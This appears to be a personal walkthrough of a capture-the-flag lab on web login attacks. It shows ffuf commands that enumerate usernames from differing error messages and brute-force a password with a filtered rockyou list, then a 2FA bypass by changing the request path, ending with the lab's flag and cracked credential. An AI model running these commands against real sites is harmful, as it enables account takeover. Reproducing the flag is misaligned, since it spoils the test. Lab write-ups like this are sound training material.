@@ -1,1 +1,31 @@
+Scenario
+You are tasked to perform a security assessment of a client's web application. For the assessment, the client has not provided you with credentials. Apply what you have learned in this module to obtain the flag.
 
+CHALLENGE: 94.237.53.146:55903 
+
+
+Question 1 - Obtain the flag. - HTB{d86115e037388d0fa29280b737fd9171} 
+1) go to http://94.237.53.146:55903 -> login -> register account 
+2) once we try to register an account we are faced with password requirements -> 
+Password does not meet our password policy:
+
+    Contains at least one digit
+    Contains at least one lower-case character
+    Contains at least one upper-case character
+    Contains NO special characters
+    Is exactly 12 characters long
+3) to follow these lets make our own edited rockyou -> 
+
+sudo grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{12}' > rockyouedit.txt
+
+
+4) now we can register an account with any of these passwords -> i just typed -> head rockyouedit.txt and chose -> Liverpool123 
+5) once logged in we are met iwth "You do not have admin privileges. The site is still under construction and only available to admins at this time." 
+6) lets try logging in with correct user and random pass then random user and pass and see how the error messages are presented 
+7) double random creds gives us "unknown user or password" but with our test user account and wrong password we are presented with "Invalid credentials."
+8) ffuf to enumerate valid usernames -> ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.53.146:55903/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=123" -fr "Unknown username or password."
+9) we are stopped with an output of -> gladys for a username 
+10) now lets flip our ffuf and use our rockyouedit.txt to find ol gladys's password -> ffuf -w rockyouedit.txt -u http://94.237.53.146:55903/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials." -t 60
+11) we find our password of: dWinaldasD13 so gladys:dWinaldasD13
+12) go back to login page and log in -> now we are faced with 2fa OTP 
+13) intercept the /2fa.php request... we cant brute force it but what we can do is inside of repeater change the /2fa.php to /profile.php and hit send -> render inside of Response tab and we get the flag -> HTB{d86115e037388d0fa29280b737fd9171}
